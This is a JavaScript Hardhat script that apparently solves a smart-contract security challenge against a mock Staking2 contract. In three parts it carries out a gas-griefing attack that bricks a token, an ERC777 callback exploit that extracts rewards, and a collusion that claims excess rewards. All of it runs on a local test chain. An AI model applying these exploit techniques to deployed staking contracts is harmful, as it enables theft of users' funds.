const { expect } = require("chai");
const { ethers } = require("hardhat");
const { deploy1820 } = require("./utils/helpers.js");

async function deploy(deployer) {
    const rewards = await (
        await ethers.getContractFactory("MockERC20", deployer)
    ).deploy(ethers.utils.parseEther("200", "ether"));
    const stakableExpensive = await (
        await ethers.getContractFactory("ExpensiveToken", deployer)
    ).deploy(ethers.utils.parseEther("10", "ether"));
    const staking = await (await ethers.getContractFactory("Staking2", deployer)).deploy(rewards.address);

    await deploy1820();
    const stakable777 = await (
        await ethers.getContractFactory("MockERC777", deployer)
    ).deploy(ethers.utils.parseEther("10", "ether"));

    const stakableNormal = await (
        await ethers.getContractFactory("MockERC20", deployer)
    ).deploy(ethers.utils.parseEther("10", "ether"));

    return [rewards, stakableExpensive, staking, stakable777, stakableNormal];
}

async function main() {
    console.log("\n CHALLENGE - 5\n");
    const [deployer, rewarder, user, attacker, attacker2] = await ethers.getSigners();
    const [rewards, stakableExpensive, staking, stakable777, stakableNormal] = await deploy(deployer);

    await rewards.connect(deployer).transfer(rewarder.address, ethers.utils.parseEther("133", "ether"));

    // setup for part A
    await stakableExpensive.connect(deployer).transfer(user.address, ethers.utils.parseEther("3", "ether"));
    await stakableExpensive
        .connect(user)
        .approve(staking.address, await stakableExpensive.connect(user).balanceOf(user.address));
    await staking.connect(user).stake(stakableExpensive.address, ethers.utils.parseEther("1", "ether"));
    await rewards
        .connect(rewarder)
        .approve(staking.address, await rewards.connect(rewarder).balanceOf(rewarder.address));
    await staking.connect(rewarder).addReward(stakableExpensive.address, ethers.utils.parseEther("33", "ether"));

    // setup for part B
    await stakable777.connect(deployer).transfer(user.address, ethers.utils.parseEther("3", "ether"));
    await stakable777.connect(user).approve(staking.address, await stakable777.connect(user).balanceOf(user.address));
    await staking.connect(user).stake(stakable777.address, await stakable777.connect(user).balanceOf(user.address));

    // setup for part C
    await stakableNormal.connect(deployer).transfer(attacker.address, ethers.utils.parseEther("5", "ether"));
    await stakableNormal
        .connect(attacker)
        .approve(staking.address, await stakableNormal.connect(attacker).balanceOf(attacker.address));
    await stakableNormal.connect(deployer).transfer(attacker2.address, ethers.utils.parseEther("5", "ether"));
    await stakableNormal
        .connect(attacker2)
        .approve(staking.address, await stakableNormal.connect(attacker2).balanceOf(attacker2.address));

    // deploy attack contract for parts A and B
    const Attack = await ethers.getContractFactory("Staking2Attack", attacker);
    const attack = await Attack.deploy(staking.address);
    await rewards.connect(deployer).transfer(attack.address, ethers.utils.parseEther("1", "ether"));
    await stakableExpensive.connect(deployer).transfer(attack.address, ethers.utils.parseEther("1", "ether"));
    await stakable777.connect(deployer).transfer(attack.address, ethers.utils.parseEther("6", "ether"));
    await rewards.connect(deployer).transfer(attack.address, ethers.utils.parseEther("66", "ether"));

    // ------------------------------------------------------------------------

    console.log("\n CHALLENGE - 5A\n");
    // This attack can also be peformed using a token with callbacks, but we
    // illustrate the dangers of insufficient gas griefing by perfoming the
    // attack using a token _without_ callbacks.
    await attack.setUpOne(stakableExpensive.address);

    const unstakeGas = await (async () => {
        const intrinsicGas = 21_000;
        await ethers.provider.send("hardhat_impersonateAccount", [attack.address]);
        const attackSigner = await ethers.getSigner(attack.address);
        const result = (await staking.connect(attackSigner).estimateGas.unstake(stakableExpensive.address, 1)).sub(
            intrinsicGas
        );
        await ethers.provider.send("hardhat_stopImpersonatingAccount", [attack.address]);
        return result;
    })();

    console.log("running attack");
    const gasDeficit = 10_000; // determined by experimentation
    await attack.attackOne(stakableExpensive.address, unstakeGas.sub(gasDeficit));

    console.log("checking attack");
    await expect(
        staking.connect(user).stake(stakableExpensive.address, ethers.utils.parseEther("1", "ether"))
    ).to.be.revertedWith("Staking2: badly-behaved token");
    await expect(
        staking.connect(user).unstake(stakableExpensive.address, ethers.utils.parseEther("1", "ether"))
    ).to.be.revertedWith("Staking2: badly-behaved token");
    console.log("token is bricked!");

    // ------------------------------------------------------------------------

    console.log("\n CHALLENGE - 5B\n");
    const beforeBalanceReward = await rewards.balanceOf(attack.address);
    const beforeBalanceStake = await stakable777.balanceOf(attack.address);
    await attack.attackTwo(stakable777.address);
    console.log(
        "reward profit/loss: %s",
        ethers.utils.formatEther((await rewards.balanceOf(attack.address)).sub(beforeBalanceReward))
    );
    console.log(
        "stake profit/loss: %s",
        ethers.utils.formatEther((await stakable777.balanceOf(attack.address)).sub(beforeBalanceStake))
    );

    // ------------------------------------------------------------------------

    console.log("\n CHALLENGE - 5C\n");

    // This reward should never be claimable. We'll claim it below.
    await staking.connect(rewarder).addReward(ethers.constants.AddressZero, ethers.utils.parseEther("50", "ether"));

    await staking.connect(attacker).stake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
    await staking.connect(attacker2).stake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
    await staking.connect(rewarder).addReward(stakableNormal.address, ethers.utils.parseEther("50", "ether"));
    await staking.connect(attacker).unstake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
    await staking.connect(attacker2).unstake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
    const totalReward = (await rewards.connect(attacker).balanceOf(attacker.address)).add(
        await rewards.connect(attacker2).balanceOf(attacker2.address)
    );
    await expect(totalReward).to.be.above(ethers.utils.parseEther("50", "ether"));
    console.log("excess reward: %s", ethers.utils.formatEther(totalReward.sub(ethers.utils.parseEther("50", "ether"))));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
